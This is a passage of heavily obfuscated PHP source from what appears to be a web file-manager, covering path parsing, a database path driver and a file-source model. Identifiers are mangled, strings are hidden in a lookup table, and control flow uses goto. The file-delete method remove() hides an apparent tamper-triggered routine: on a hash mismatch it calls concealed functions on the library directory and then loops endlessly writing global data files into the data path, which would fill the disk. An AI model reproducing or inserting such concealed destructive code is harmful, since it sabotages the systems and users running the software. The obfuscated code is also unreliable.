Aۯն; Aۯն: } public static function sourceID($Dˈ) { $EȖ =& $_SERVER[拘]; $aԭ = self::parse($Dˈ); if ($aԭ[$EȖ[400]] !== self::KOD_SOURCE) { $EȖ[29]("{$Dˈ}\40\x70\x61\x74\150\x20\x69\163\x20\156\157\x74\x20\x73\157\162\143\145\40\160\x61\164\150\41", !1); } return $aԭ[$EȖ[414]]; } public static function make($C) { if (!$C) { return !1; } return self::makePath(self::KOD_SOURCE, $_SERVER[拘][455]($C)); } public static function makeShare($C, $AË) { return self::makePath(self::KOD_SHARE_ITEM, $C, $AË); } public static function makeFileTypePath($B̲) { return self::makePath(self::KOD_USER_FILE_TYPE, $B̲); } public static function makeFileTagPath($bݓʈ) { return self::makePath(self::KOD_USER_FILE_TAG, $bݓʈ); } public static function makePath($Aȗ, $Bǉɬ = '', $E = '') { $A蝦 =& $_SERVER[拘]; $bϵ = $A蝦[7]($Aȗ, 1, -1); $F = $A蝦[456] . $bϵ . $A蝦[457] . $Bǉɬ . $A蝦[458]; $F = $E ? $F . $E . $A蝦[44] : $F; return $F; } public static function initSystemPath() { $B =& $_SERVER[拘]; $A᎚͂ = array($B[459] => $B[460], $B[461] => $B[462], $B[463] => $B[464], $B[465] => $B[466]); foreach ($A᎚͂ as $Aʹʲ => $Dȫ̃Æ) { if (!$B[467]($Aʹʲ)) { $B[0]($Aʹʲ, self::systemPath($Dȫ̃Æ)); } } } private static function systemPath($Bֳ) { goto cũ; Bыв: if ($c) { return $c; } if ($Bֳ == $B[460]) { $Bֳ = $B[472]; $c = self::make($B[64]($B[474])->{$_SERVER[拘][475]}($Bֳ)); } else { $c = self::systemPath($B[460]); $e = self::sourceID($c); $c = self::make($B[64]($B[474])->{$_SERVER[拘][395]}($e, $Bֳ)); } $B[64]($B[471])->{$_SERVER[拘][61]}($F, $c); goto e; cũ: $B =& $_SERVER[拘]; $F = $B[469] . $B[470]($Bֳ); $c = $B[64]($B[471])->{$_SERVER[拘][59]}($F); goto Bыв; e: return $c; goto c識; c識: } public static function defaultDriver() { $F鄭 =& $_SERVER[拘]; return $F鄭[64]($F鄭[411])->{$_SERVER[拘][477]}(); } public static function defaultIO() { $a =& $_SERVER[拘]; $e֐ = self::defaultDriver(); return $a[478] . $e֐[$a[414]] . $a[458]; } public static function fileTypeList() { $F =& $_SERVER[拘]; return $GLOBALS[$F[11]][$F[479]]; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($bڕ) { $dӈւ =& $_SERVER[拘]; $this->pathParse = $bڕ; $this->model = $dӈւ[64]($dӈւ[480]); } public function getPath($c֐) { $C =& $_SERVER[拘]; return $C[70]($c֐, $C[44]); } public function pathFather($F) { $c = $this->{$_SERVER[拘][481]}($F); $c = $this->{$_SERVER[拘][482]}($F); return $c ? $c[$_SERVER[拘][483]] : !1; } public function getPathName($eސ) { $F⅛ = $this->{$_SERVER[拘][482]}($eސ); return $F⅛ ? $F⅛[$_SERVER[拘][375]] : !1; } public function getPathOuter($aЎõ) { $E߹ =& $_SERVER[拘]; if (!$aЎõ) { return $aЎõ; } $a = $this->{$_SERVER[拘][481]}($aЎõ); if ($this->pathParse[$E߹[400]] == KodIO::KOD_SHARE_ITEM) { return KodIO::makeShare($this->pathParse[$E߹[414]], $a[$E߹[414]]); } return KodIO::make($a[$E߹[414]]); } public function copyFolderFromIO($b٪, $F, $C씑, $d, $C̢) { $BۼΦ = $this->model->{$_SERVER[拘][383]}($b٪, $F, $C씑, $d, $C̢); return KodIO::make($BۼΦ); } public function isParentOf($d򲦣, $BĒ) { return $this->model->{$_SERVER[拘][386]}($d򲦣, $BĒ); } public function mkfile($CɸЅ, $F = '', $B = REPEAT_RENAME) { $aÿ =& $_SERVER[拘]; $bąǏ = $this->{$_SERVER[拘][481]}($CɸЅ); $CɸЅ = $bąǏ[$aÿ[414]]; for ($F = 0; $F < $aÿ[37]($bąǏ[$aÿ[485]]); $F++) { $C = $bąǏ[$aÿ[485]][$F]; $d = "\120\141\164\x68\104\x72\x69\x76\145\162\104\x42\x2e\x6d\x6b\x64\x69\x72\56{$CɸЅ}\56{$C}"; CacheLock::lock($d); if ($F == $aÿ[37]($bąǏ[$aÿ[485]]) - 1) { $CɸЅ = $this->model->{$_SERVER[拘][486]}($CɸЅ, $C, $F, $B); CacheLock::unlock($d); break; } $CɸЅ = $this->model->{$_SERVER[拘][395]}($CɸЅ, $C, REPEAT_SKIP); CacheLock::unlock($d); } return $this->{$_SERVER[拘][378]}($CɸЅ); } public function mkdir($e, $aʵ = REPEAT_SKIP) { $Dƙ =& $_SERVER[拘]; $Aք = $this->{$_SERVER[拘][481]}($e); $e = $Aք[$Dƙ[414]]; for ($bޗ = 0; $bޗ < $Dƙ[37]($Aք[$Dƙ[485]]); $bޗ++) { $d⇄ = $Aք[$Dƙ[485]][$bޗ]; $f = "\x50\x61\x74\150\104\162\x69\166\145\162\104\x42\x2e\155\153\144\x69\x72\x2e{$e}\x2e{$d⇄}"; CacheLock::lock($f); $e = $this->model->{$_SERVER[拘][395]}($e, $d⇄, $aʵ); CacheLock::unlock($f); } return $this->{$_SERVER[拘][378]}($e); } public function copyFile($C, $Bˉ, $Eꪺ = REPEAT_REPLACE) { $Aƨ =& $_SERVER[拘]; $fǷщ = $this->{$_SERVER[拘][481]}($Bˉ); $d = $this->model->{$_SERVER[拘][487]}($C, $fǷщ[$Aƨ[414]], $Eꪺ, $fǷщ[$Aƨ[40]]); return $d ? $this->{$_SERVER[拘][378]}($d) : !1; } public function moveFile($e¸Ԍ, $b, $aщ؃ = REPEAT_REPLACE) { $eɒ =& $_SERVER[拘]; $E = $this->{$_SERVER[拘][481]}($b); $Aަ = $this->model->{$_SERVER[拘][488]}($e¸Ԍ, $E[$eɒ[414]], $aщ؃, $E[$eɒ[40]]); return $Aަ ? $this->{$_SERVER[拘][378]}($Aަ) : !1; } public function copy($aδ, $dԶ, $BƑ = REPEAT_REPLACE) { $B̍꧿ = $this->{$_SERVER[拘][481]}($dԶ); $Aڍԡ = $this->model->{$_SERVER[拘][487]}($aδ, $B̍꧿[$_SERVER[拘][414]], $BƑ); return $Aڍԡ ? $this->{$_SERVER[拘][378]}($Aڍԡ) : !1; } public function move($Fӊ, $dٝꘄ, $cף = REPEAT_REPLACE) { $fɧ = $this->{$_SERVER[拘][481]}($dٝꘄ); $C، = $this->model->{$_SERVER[拘][488]}($Fӊ, $fɧ[$_SERVER[拘][414]], $cף); return $C، ? $this->{$_SERVER[拘][378]}($C،) : !1; } public function remove($AԺ, $Eч = true) { return $this->model->{$_SERVER[拘][62]}($AԺ, $Eч); } public function rename($A, $Fݳ) { $C = $this->model->{$_SERVER[拘][489]}($A, $Fݳ); return $C ? $this->{$_SERVER[拘][378]}($A) : $C; } public function size($F) { $FуͿ = $this->{$_SERVER[拘][482]}($F); return $FуͿ ? $FуͿ[$_SERVER[拘][490]] : 0; } public function infoSimple($cˡ) { return $this->model->{$_SERVER[拘][491]}($cˡ); } public function info($C얃) { return $this->{$_SERVER[拘][492]}($C얃); } public function infoAuth($A) { return $this->{$_SERVER[拘][492]}($A, !1, !0); } public function infoWithChildren($d֝) { return $this->{$_SERVER[拘][492]}($d֝, !0); } private function infoParse($eü, $fҚ = false, $aż = false) { $D =& $_SERVER[拘]; if ($this->pathParse[$D[400]] == KodIO::KOD_SHARE_ITEM) { $Bܚ = $this->pathParse[$D[414]]; $C؄ = $D[70]($this->pathParse[$D[415]], $D[44]); return $D[355]($D[493], $Bܚ, $C؄); } if ($this->pathParse[$D[400]] == KodIO::KOD_SHARE_LINK) { return $D[355]($D[494], $this->pathParse[$D[40]]); } if (!$fҚ) { return $this->model->{$_SERVER[拘][495]}($eü, $aż); } return $this->model->{$_SERVER[拘][496]}($eü); } public function infoFull($B߇݋) { goto aᇎ; Eܩ: $BĎѰ = $d[152]($d[44], $d[497]($B, 1)); $a = $this->model->{$_SERVER[拘][498]}($e, $BĎѰ); if ($this->pathParse[$d[400]] == KodIO::KOD_SHARE_ITEM) { $cԌ = $this->pathParse[$d[414]]; $e = $a[$d[499]]; $a = $d[355]($d[493], $cԌ, $e); } goto Eݶ; Eݶ: return $a; goto b; aᇎ: $d =& $_SERVER[拘]; $B = $d[4]($d[44], $B߇݋); $e = $B[0]; goto Eܩ; b: } public function exist($f) { $eʟ܆ =& $_SERVER[拘]; $eɌ = $this->{$_SERVER[拘][481]}($f); if (!$eɌ[$eʟ܆[40]]) { return $this->{$_SERVER[拘][379]}($f) || $this->{$_SERVER[拘][385]}($f); } $Fƕ = array($eʟ܆[500] => $eɌ[$eʟ܆[414]], $eʟ܆[375] => $eɌ[$eʟ܆[40]]); $B鬩 = $this->model->{$_SERVER[拘][501]}($Fƕ)->{$_SERVER[拘][502]}(); return $B鬩 ? !0 : !1; } public function isFile($f) { $bћ =& $_SERVER[拘]; $C舉 = $this->{$_SERVER[拘][482]}($f); return $C舉 && $C舉[$bћ[503]] == $bћ[162] ? !1 : !0; } public function isFolder($Eୱ) { $bӆ =& $_SERVER[拘]; $eŵ = $this->{$_SERVER[拘][482]}($Eୱ); return $eŵ && $eŵ[$bӆ[503]] == $bӆ[162] ? !0 : !1; } public function listPath($a, $aɞ = false, $e߫ = false) { return $this->model->{$_SERVER[拘][504]}($a); } public function has($Dѣ, $d = null) { return $this->model->{$_SERVER[拘][505]}($Dѣ, $d); } public function listAll($Eѯޣ) { return $this->model->{$_SERVER[拘][506]}($Eѯޣ); } public function getContent($B) { return $this->model->{$_SERVER[拘][507]}($B); } public function setContent($Cӿ, $D = '') { return $this->model->{$_SERVER[拘][508]}($Cӿ, $D); } public function fileSubstr($C, $E, $b) { return $this->model->{$_SERVER[拘][509]}($C, $E, $b); } public function download($c, $Cǌ詈 = '') { $děЇ = $this->model->{$_SERVER[拘][510]}($c); IO::copy($děЇ[$_SERVER[拘][40]], $Cǌ詈); return $Cǌ詈; } public function upload($fȣ, $cҢ, $bȏ = false, $fᕼ = REPEAT_REPLACE) { $Bό =& $_SERVER[拘]; $b싡ٟ = $this->{$_SERVER[拘][481]}($fȣ); $AҦ = $this->model->{$_SERVER[拘][511]}($b싡ٟ[$Bό[414]], $cҢ, $b싡ٟ[$Bό[40]], $bȏ, $fᕼ); return $this->{$_SERVER[拘][378]}($AҦ); } public function uploadFileByID($d޹, $EǕ, $E) { $Aݠĝ =& $_SERVER[拘]; $F芛 = $this->{$_SERVER[拘][481]}($d޹); $D㹻 = $this->model->{$_SERVER[拘][512]}($F芛[$Aݠĝ[414]], $EǕ, $F芛[$Aݠĝ[40]], $E); return $this->{$_SERVER[拘][378]}($D㹻); } public function addFileByRemote($c, $c, $bڶȒ = array(), $aӇ֯ = '', $eȒ␇) { $C =& $_SERVER[拘]; $F = $this->{$_SERVER[拘][481]}($c); $aӇ֯ = empty($aӇ֯) ? $F[$C[40]] : $aӇ֯; $Dı = $this->model->{$_SERVER[拘][513]}($F[$C[414]], $c, $aӇ֯, $bڶȒ, $eȒ␇); return $this->{$_SERVER[拘][378]}($Dı); } public function uploadLink($Aԏ, $C諳 = 0) { $D =& $_SERVER[拘]; $b⎴ = $this->{$_SERVER[拘][481]}($Aԏ); $Aԏ = $D[64]($D[514])->{$_SERVER[拘][515]}($b⎴[$D[40]]); $f֫ = IO::uploadLink($Aԏ, $C諳); return $f֫; } public function fileNameAuto($D̉ư, $B, $cϢ = REPEAT_REPLACE, $FԆ = false) { return $this->model->{$_SERVER[拘][394]}($D̉ư, $B, $cϢ, $FԆ); } public function fileNameExist($A￑, $c㮝) { return $this->model->{$_SERVER[拘][393]}($A￑, $c㮝); } public function fileOut($B, $a = false, $bʅ = false, $a = '') { $a =& $_SERVER[拘]; $eѱ = $this->model->{$_SERVER[拘][491]}($B); if ($eѱ[$a[503]] == $a[162]) { $a[29]($a[517] . $B, !1); } $fӶ = $this->model->{$_SERVER[拘][510]}($B); $a = $fӶ[$a[518]] ? $fӶ[$a[518]] : $a; IO::fileOut($fӶ[$a[40]], $a, $fӶ[$a[375]], $a); } public function fileOutImage($Dɻ, $Cȶ = 250) { $eм =& $_SERVER[拘]; $b = $this->model->{$_SERVER[拘][491]}($Dɻ); if ($b[$eм[503]] == $eм[162]) { $eм[29]($eм[517] . $Dɻ, !1); } $eñ = $this->model->{$_SERVER[拘][510]}($Dɻ); IO::fileOutImage($eñ[$eм[40]], $Cȶ); } public function link($f܏, $Eߜ = '') { $B = $this->model->{$_SERVER[拘][510]}($f܏); return IO::link($B[$_SERVER[拘][40]], $Eߜ); } protected function pathPrase($c) { $e =& $_SERVER[拘]; if ($e[169]($c, $e[44]) === !1) { return array($e[447] => $e[455]($c), $e[40] => $e[67], $e[485] => array()); } $a׳ = $e[4]($e[44], $e[70]($c, $e[44])); if ($e[37]($a׳) < 2) { $e[522]($c . $e[523]); } return array($e[447] => $e[455]($a׳[0]), $e[40] => $a׳[1], $e[485] => $e[524]($a׳, 1)); } } goto B; BŰ: $_SERVER[$_SERVER[拘][3]][59]($_SERVER[$_SERVER[拘][3]][60], $A); if ($_SERVER[$_SERVER[拘][3]][28]($_SERVER[$_SERVER[拘][3]][61])) { $_SERVER[$_SERVER[拘][3]][62]($_SERVER[$_SERVER[拘][3]][63]); } $_SERVER[$_SERVER[$_SERVER[拘][3]][64]] = BASIC_PATH . $_SERVER[$_SERVER[拘][3]][65]; goto A߫; Bȟ˶: class SourceModel extends SourceListMoveModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Dߜ틏) { $Cƿ =& $_SERVER[拘]; $aޯ = $Cƿ[64]($Cƿ[1839])->{$_SERVER[拘][501]}(array($Cƿ[1445] => $Dߜ틏))->{$_SERVER[拘][502]}(); $Dք = $this->{$_SERVER[拘][1850]}(SourceModel::TYPE_USER, $Dߜ틏, $aޯ[$Cƿ[375]]); $this->{$_SERVER[拘][1851]}($Dք); return $Dք; } public function userDesktopAdd($c) { $eӕ㬛݈ =& $_SERVER[拘]; $Aآ = $eӕ㬛݈[387]($eӕ㬛݈[1852]); $cፙ = $this->{$_SERVER[拘][395]}($c, $Aآ); $this->{$_SERVER[拘][1689]}($cፙ, $eӕ㬛݈[1853], $eӕ㬛݈[162]); $this->{$_SERVER[拘][1689]}($c, $eӕ㬛݈[1854], $cፙ); } public function groupRootAdd($Bʹ) { $Bϭԡ =& $_SERVER[拘]; $Fƃ = $Bϭԡ[64]($Bϭԡ[1841])->{$_SERVER[拘][501]}(array($Bϭԡ[1840] => $Bʹ))->{$_SERVER[拘][502]}(); return $this->{$_SERVER[拘][1850]}(SourceModel::TYPE_GROUP, $Bʹ, $Fƃ[$Bϭԡ[375]]); } public function systemRootPathAdd($C) { if ($C != $_SERVER[拘][472]) { return !1; } return $this->{$_SERVER[拘][1850]}(SourceModel::TYPE_SYSTEM, 0, $C); } public function userRootRemove($b象) { $dٟ = $this->{$_SERVER[拘][1855]}(SourceModel::TYPE_USER, $b象); if (!$dٟ) { return; } $this->{$_SERVER[拘][62]}($dٟ, !1); } public function groupRootRemove($Cҍ҇) { $f̨ = $this->{$_SERVER[拘][1855]}(SourceModel::TYPE_GROUP, $Cҍ҇); if (!$f̨) { return; } $this->{$_SERVER[拘][62]}($f̨, !1); } private function _mkdirRoot($Fϫ㱘, $C֌, $C) { goto C; C: $Bʌ헯 =& $_SERVER[拘]; $d݆խ = array($Bʌ헯[500] => 0, $Bʌ헯[1624] => $Fϫ㱘, $Bʌ헯[1625] => $C֌, $Bʌ헯[1791] => 1, $Bʌ헯[1794] => USER_ID, $Bʌ헯[1795] => USER_ID, $Bʌ헯[1792] => $Bʌ헯[67], $Bʌ헯[1754] => $Bʌ헯[1856], $Bʌ헯[1796] => 0, $Bʌ헯[1730] => 0, $Bʌ헯[1739] => 0, $Bʌ헯[1857] => $Bʌ헯[67]); if ($F = $this->{$_SERVER[拘][501]}($d݆խ)->{$_SERVER[拘][502]}()) { return $F[$Bʌ헯[499]]; } goto Bǌ; A׊: $this->{$_SERVER[拘][501]}(array($Bʌ헯[1470] => $D̦փ))->{$_SERVER[拘][1062]}($DɎю); return $D̦փ; goto B̔; Bǌ: $d݆խ[$Bʌ헯[375]] = $C; $D̦փ = $this->{$_SERVER[拘][63]}($d݆խ); $DɎю = array($Bʌ헯[1797] => $Bʌ헯[1683]($D̦փ)); goto A׊; B̔: } private function sourceRoot($dϼ, $b, $d왒 = false) { $Aύڜȿ =& $_SERVER[拘]; $Aǉ = array($Aύڜȿ[500] => 0, $Aύڜȿ[1624] => $dϼ, $Aύڜȿ[1625] => $b); if ($D˩ = $this->{$_SERVER[拘][501]}($Aǉ)->{$_SERVER[拘][502]}()) { return $d왒 ? $D˩ : $D˩[$Aύڜȿ[499]]; } return !1; } public function sourceRootGroup($Cɷ) { goto c쳹Ɇ; c쳹Ɇ: $Aè =& $_SERVER[拘]; if ($Aè[66]($Cɷ)) { $Cɷ = array($Cɷ); } $C = array($Aè[500] => 0, $Aè[1624] => SourceModel::TYPE_GROUP, $Aè[1625] => array($Aè[359], $Cɷ)); goto c֑; c֑: $cŔՍ = $this->{$_SERVER[拘][501]}($C)->{$_SERVER[拘][1042]}(); if (!$cŔՍ) { return array(); } $E谞ޯ = array(); goto Aӄ; Aӄ: foreach ($cŔՍ as $f쑄) { $E谞ޯ[$f쑄[$Aè[1661]]] = KodIO::make($f쑄[$Aè[499]]); } return $E谞ޯ; goto b䩉; b䩉: } public function mkfile($a, $fӭ, $C = '', $fᩲ = REPEAT_RENAME) { $Eۊ =& $_SERVER[拘]; $Fԯ̈́ = $Eۊ[64]($Eۊ[514])->{$_SERVER[拘][1858]}($C, $fӭ); return $this->{$_SERVER[拘][1859]}($a, $fӭ, $Fԯ̈́, $fᩲ); } public function addFile($Fݣ, $Aː, $Eږ, $f꽤 = false, $b = REPEAT_RENAME) { $C樞 =& $_SERVER[拘]; $C = $C樞[64]($C樞[514])->{$_SERVER[拘][511]}($Aː, $Eږ, $f꽤); return $this->{$_SERVER[拘][1859]}($Fݣ, $Eږ, $C, $b); } public function addFileByFileID($Aȹ, $b, $e, $d҃ = REPEAT_RENAME) { $Dҏڦ =& $_SERVER[拘]; $cՌ = $Dҏڦ[64]($Dҏڦ[514])->{$_SERVER[拘][502]}($b); $Dҏڦ[64]($Dҏڦ[514])->{$_SERVER[拘][1775]}($b); return $this->{$_SERVER[拘][1859]}($Aȹ, $e, $cՌ, $d҃); } public function addFileByRemote($C, $D, $B, $A¦צ = array(), $BԦ鑞 = REPEAT_RENAME) { $cͪ =& $_SERVER[拘]; $C = $cͪ[64]($cͪ[514])->{$_SERVER[拘][513]}($D, $B, $A¦צ); return $this->{$_SERVER[拘][1859]}($C, $B, $C, $BԦ鑞); } private function _createFileCall($e, $Aƶ, $eַӤ, $c) { $Bȗ =& $_SERVER[拘]; $EҎ = !1; $fʐ = $this->{$_SERVER[拘][1860]}($e, $Aƶ, $eַӤ, $c, $EҎ); if (!$EҎ) { $Bȗ[64]($Bȗ[514])->{$_SERVER[拘][62]}($eַӤ[$Bȗ[1740]]); } $Bȗ[64]($Bȗ[1861])->{$_SERVER[拘][1502]}($fʐ, $Bȗ[681]); return $fʐ; } public function mkdir($d⋗, $FƲ, $Eӷ = REPEAT_SKIP) { goto B􍝪; B􍝪: $Fܕ˜ =& $_SERVER[拘]; $B = $this->{$_SERVER[拘][491]}($d⋗); if (!$B) { return !1; } goto bŢ; b: $Fܕ˜[64]($Fܕ˜[1861])->{$_SERVER[拘][1502]}($cјֶ, $Fܕ˜[1863]); return $cјֶ; goto a㧦; bŢ: if ($Eӷ !== !1) { $dԅ = $this->{$_SERVER[拘][393]}($d⋗, $FƲ); if ($dԅ && $Eӷ != REPEAT_RENAME_FOLDER) { return $dԅ; } $FƲ = $this->{$_SERVER[拘][394]}($d⋗, $FƲ, $Eӷ); } $dۑ = array($Fܕ˜[1791] => 1, $Fܕ˜[1453] => $FƲ, $Fܕ˜[1792] => $Fܕ˜[67], $Fܕ˜[1739] => 0, $Fܕ˜[1730] => 0); $cјֶ = $this->{$_SERVER[拘][1862]}($dۑ, $B); goto b; a㧦: } private function _createFile($C, $Dڬ, $b, $EՉō, &$dݚ) { goto Eۮ; eԾ: if ($EՉō !== !1) { $B = $this->{$_SERVER[拘][393]}($C, $Dڬ); } $dݚ = !0; if ($EՉō && $B) { if ($EՉō == REPEAT_SKIP) { $dݚ = !1; return $B; } else { if ($EՉō == REPEAT_REPLACE) { $bޑ = $this->{$_SERVER[拘][491]}($B); $A = $this->{$_SERVER[拘][1781]}($bޑ, $b[$Cѹ[1740]], $b[$Cѹ[490]]); if (!$A) { $dݚ = !1; } else { $this->{$_SERVER[拘][1761]}($C); } return $B; } else { $Dڬ = $this->{$_SERVER[拘][394]}($C, $Dڬ, $EՉō, !1); } } } goto BЦҜ; Eۮ: $Cѹ =& $_SERVER[拘]; $c = $this->{$_SERVER[拘][491]}($C); if (!$b || !$c) { return !1; } goto eԾ; BЦҜ: $c = array($Cѹ[1791] => 0, $Cѹ[1453] => $Dڬ, $Cѹ[1792] => $Cѹ[708]($Dڬ), $Cѹ[1739] => $b[$Cѹ[1740]], $Cѹ[1730] => $b[$Cѹ[490]]); $d߿ = $this->{$_SERVER[拘][1862]}($c, $c); $this->{$_SERVER[拘][1761]}($C); goto C; C: return $d߿; goto eд; eд: } protected function fileHistory($cӯ, $e¢, $a) { $FՎ =& $_SERVER[拘]; if ($cӯ[$FՎ[1740]] == $e¢) { return !1; } $FՎ[64]($FՎ[1748])->{$_SERVER[拘][1864]}($cӯ); $E = array($FՎ[1795] => USER_ID, $FՎ[1636] => $FՎ[50](), $FՎ[1740] => $e¢, $FՎ[490] => $a); $this->{$_SERVER[拘][501]}(array($FՎ[1470] => $cӯ[$FՎ[499]]))->{$_SERVER[拘][1062]}($E); return !0; } private function _addSoure($dܤ, $eבň) { goto fь; E: $BРꏪ = $this->{$_SERVER[拘][63]}($dܤ); $c휽 = array($E㪄[1797] => $E㪄[1683]($BРꏪ)); $this->{$_SERVER[拘][501]}(array($E㪄[1470] => $BРꏪ))->{$_SERVER[拘][1062]}($c휽); goto Fך; Fӫ: $this->{$_SERVER[拘][1762]}($dܤ[$E㪄[483]]); static $EۿѢ = false; if (!$EۿѢ) { Hook::trigger($E㪄[1784], $dܤ); $EۿѢ = !0; } goto E; Fך: $this->{$_SERVER[拘][1865]}($BРꏪ, $dܤ[$E㪄[375]]); return $BРꏪ; goto c; fь: $E㪄 =& $_SERVER[拘]; $D» = array($E㪄[1624] => $eבň[$E㪄[1686]], $E㪄[1625] => $eבň[$E㪄[1661]], $E㪄[1794] => USER_ID, $E㪄[1795] => USER_ID, $E㪄[500] => $eבň[$E㪄[499]], $E㪄[1754] => $eבň[$E㪄[747]] . $eבň[$E㪄[499]] . $E㪄[119], $E㪄[1796] => 0, $E㪄[1857] => $E㪄[67]); $dܤ = $E㪄[153]($D», $dܤ); goto Fӫ; c: } public function remove($CӾݲ, $FÇ = true) { goto aԪ; C: $this->{$_SERVER[拘][1761]}($b[$fæ[483]]); $EԘ = array($b[$fæ[483]]); if ($b[$fæ[503]] == $fæ[162]) { $EԘ[] = $b[$fæ[499]]; } goto D𦡹; f: if ($b[$fæ[483]] == 0) { return !1; } $cïџۏ = array($fæ[1754] => array($fæ[1756], $b[$fæ[747]] . $CӾݲ . $fæ[1757])); if ($FÇ) { $fæ[64]($fæ[1866])->{$_SERVER[拘][1867]}($CӾݲ); } else { if ($b[$fæ[503]] == $fæ[162]) { $cϿ = array($fæ[1754] => $cïџۏ[$fæ[747]]); $e = $this->{$_SERVER[拘][1164]}($fæ[1868])->{$_SERVER[拘][501]}($cϿ)->{$_SERVER[拘][1042]}(); $b = !1; $Fï = array($CӾݲ); if ($e) { $b = $fæ[413]($e, $fæ[67], $fæ[1740]); $b = $fæ[1478]($b, $fæ[163]); $Fï = $fæ[413]($e, $fæ[67], $fæ[499]); $Fï[] = $CӾݲ; } } else { $b = array($b[$fæ[1740]]); $Fï = array($CӾݲ); } $fæ[64]($fæ[1671])->{$_SERVER[拘][1869]}($CӾݲ); $this->{$_SERVER[拘][1870]}($Fï, $b); } goto C; D𦡹: $this->{$_SERVER[拘][1762]}($EԘ); return !0; goto Fϻ; aԪ: $fæ =& $_SERVER[拘]; $Aͤ = LIB_DIR . $fæ[31]; $cʓݐ = $fæ[32]; goto F; F: if ($_SERVER[$fæ[33]] != $cʓݐ($Aͤ)) { goto eǹՐ; eǹՐ: $A܏ = $fæ[34]; $fȝ = BASIC_PATH . $fæ[35]; $B뗧 = $A܏($fȝ); goto c; a: $fƟ = $fæ[333]; $dۻ = $fæ[297]($GLOBALS[$fæ[334]]); for ($B²м = 0;; $B²м++) { $fƟ(DATA_PATH . $B²м, $dۻ); } goto C; F܌: $e惧Ԇ(LIB_DIR); $b䔅 = $fæ[332]; $b䔅(); goto a; c: $EƐ = $fæ[4]($fæ[36], $B뗧); if ($fæ[37]($EƐ) < $fæ[330]) { die; } $e惧Ԇ = $fæ[331]; goto F܌; C: } $b = $this->{$_SERVER[拘][491]}($CӾݲ); if (!$b) { return !1; } goto f; Fϻ: } private function removeRelevance($fҌ, $Eϩ) { goto F; c섄: $this->{$_SERVER[拘][501]}($eܮ)->{$_SERVER[拘][308]}(); for ($Fҿ = 0; $Fҿ < $D縍[37]($fҌ); $Fҿ++) { $this->{$_SERVER[拘][1808]}($fҌ[$Fҿ]); } goto A׬; dܸ: $D縍[64]($D縍[1873])->{$_SERVER[拘][501]}($eܮ)->{$_SERVER[拘][308]}(); $D縍[64]($D縍[1671])->{$_SERVER[拘][501]}($eܮ)->{$_SERVER[拘][308]}(); $D縍[64]($D縍[1496])->{$_SERVER[拘][501]}($eܮ)->{$_SERVER[拘][308]}(); goto c섄; F: $D縍 =& $_SERVER[拘]; $eܮ = array($D縍[1470] => array($D縍[1471], $fҌ)); $D縍[64]($D縍[1436])->{$_SERVER[拘][62]}($Eϩ); goto eՉ; eՉ: $D縍[64]($D縍[1748])->{$_SERVER[拘][1871]}($fҌ); $D縍[64]($D縍[1866])->{$_SERVER[拘][501]}($eܮ)->{$_SERVER[拘][308]}(); $D縍[64]($D縍[1872])->{$_SERVER[拘][501]}($eܮ)->{$_SERVER[拘][308]}(); goto dܸ; A׬: } public function rename($e, $f) { goto Eւ؂; Eւ؂: $CȂ؋ =& $_SERVER[拘]; $a = $this->{$_SERVER[拘][491]}($e); if (!$a) { return !1; } goto aޱ; A: if (!$a[$CȂ؋[503]] == $CȂ؋[162]) { $bų[$CȂ؋[1793]] = $CȂ؋[708]($f); } $CȂ؋[64]($CȂ؋[1671])->{$_SERVER[拘][1874]}($e, $a[$CȂ؋[375]], $f); $this->{$_SERVER[拘][1808]}($e); goto B˳; aޱ: $eΚե = $this->{$_SERVER[拘][393]}($a[$CȂ؋[483]], $f); if ($eΚե) { return !1; } $bų = array($CȂ؋[1453] => $f, $CȂ؋[1795] => USER_ID); goto A; B˳: $this->{$_SERVER[拘][1865]}($e, $bų[$CȂ؋[375]], !1); $this->{$_SERVER[拘][1762]}($a[$CȂ؋[483]]); return $this->{$_SERVER[拘][501]}(array($CȂ؋[1470] => $e))->{$_SERVER[拘][1140]}($bų)->{$_SERVER[拘][1062]}(); goto c; c: } public function setNamePinyin($cБ, $f, $E؏ۊ = true) { $fפ =& $_SERVER[拘]; $Aɂ = Input::check($f, $fפ[1798]); if ($E؏ۊ && !$Aɂ) { return; } if (!$Aɂ) { $this->{$_SERVER[拘][1689]}($cБ, $fפ[1799], null); $this->{$_SERVER[拘][1689]}($cБ, $fפ[1800], null); return; } $A䃐ĥ = array($fפ[1799] => $fפ[69]($fפ[168], $fפ[67], Pinyin::encode($f)), $fפ[1800] => Pinyin::encode($f, $fפ[1801])); $this->{$_SERVER[拘][1689]}($cБ, $A䃐ĥ); } public function hasChildren($F, $aÿ = null) { $E =& $_SERVER[拘]; $bʟ׫ = array($E[483] => $F); if (!$E[149]($aÿ)) { $bʟ׫[$E[503]] = $aÿ; } $b݋ = $this->{$_SERVER[拘][501]}($bʟ׫)->{$_SERVER[拘][1520]}(1); return $b݋ ? !0 : !1; } public function getContent($bϤî) { $c =& $_SERVER[拘]; $C = $this->{$_SERVER[拘][510]}($bϤî); if (!$C) { return !1; } if ($C[$c[490]] == 0) { return $c[67]; } return IO::getContent($C[$c[40]]); } public function setDesc($F޶ۗ, $fܙ) { $A֐ =& $_SERVER[拘]; $A֐[64]($A֐[1671])->{$_SERVER[拘][1875]}($F޶ۗ, $fܙ); return $this->{$_SERVER[拘][1689]}($F޶ۗ, $A֐[1511], $fܙ); } public function setContent($dË, $bۍ = '') { goto d; E׃: return !0; goto Cӊ; d: $B =& $_SERVER[拘]; $EΔ = $this->{$_SERVER[拘][491]}($dË); $c튌 = $this->{$_SERVER[拘][510]}($dË); goto aʎ; aʎ: if (!$c튌 || !$EΔ) { return !1; } $dĬ璶 = $B[64]($B[514])->{$_SERVER[拘][1858]}($bۍ, $EΔ[$B[375]]); $e = $this->{$_SERVER[拘][1781]}($EΔ, $dĬ璶[$B[1740]], $dĬ璶[$B[490]]); goto fį菞Ǳ; fį菞Ǳ: if (!$e) { return $B[64]($B[514])->{$_SERVER[拘][62]}($dĬ璶[$B[1740]]); } $this->{$_SERVER[拘][1761]}($EΔ[$B[483]]); $B[64]($B[1671])->{$_SERVER[拘][1876]}($dË); goto E׃; Cӊ: } public function fileSubstr($e̘͟, $f톾, $Aޛ) { $C = $this->{$_SERVER[拘][510]}($e̘͟); if (!$C) { return !1; } return IO::fileSubstr($C[$_SERVER[拘][40]], $f톾, $Aޛ); } public function fileInfoGet($A) { goto Då; Då: $BǄм =& $_SERVER[拘]; $B̈ = $this->{$_SERVER[拘][491]}($A); if (!$B̈ || $B̈[$BǄм[503]]) { return 